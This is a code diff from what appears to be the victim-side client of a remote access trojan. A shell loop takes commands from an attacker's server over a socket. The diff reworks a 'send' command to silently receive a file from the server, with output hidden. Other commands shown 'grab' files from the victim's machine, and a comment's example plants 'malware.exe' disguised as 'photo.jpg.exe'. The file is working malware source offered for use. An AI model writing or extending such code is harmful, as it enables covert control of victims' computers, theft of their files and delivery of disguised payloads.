@@ -16,6 +16,7 @@ import tempfile
 import hashlib
 
 from common import sendFile
+from common import HiddenPrints
 
 # Fails to import on Linux
 try:
@@ -117,7 +118,7 @@ def shell(mySocket):
                 informToServer = "[+] Some error occured. " + str(e)
                 mySocket.send(informToServer.encode())
 
-        # Command format: grab <file Path>
+        # Command format: grab <remote filepath>
         # Example: grab C:\Users\user\Desktop\photo.jpeg
         elif 'grab' == commandList[0]:
             path = " ".join(commandList[1:])
@@ -144,18 +145,16 @@ def shell(mySocket):
                 informToServer = "[+] Some error occured. " + str(e)
                 mySocket.send(informToServer.encode())
 
-
-
-        #command format: send*<destination path>*<File Name>
-        # example: send*C:\Users\John\Desktop\*photo.jpeg 
+        # Command format: send <local filepath> <remote filepath>
+        # Example: send /home/user/Desktop/malware.exe C:\Users\John\Desktop\photo.jpg.exe
         elif 'send' == commandList[0]:
-            send, path, fileName = command.decode().split("*")
             try:
-                letSend(mySocket, path, fileName)
+                destinationFile = commandList[2]
+                with HiddenPrints():
+                    receiveFile(mySocket, destinationFile)
             except Exception as e:
                 informToServer = "[+] Some error occured. " + str(e)
                 mySocket.send(informToServer.encode())
-
 
         #command format: "cd<space><Path name>"
         #split using the space between 'cd' and path name
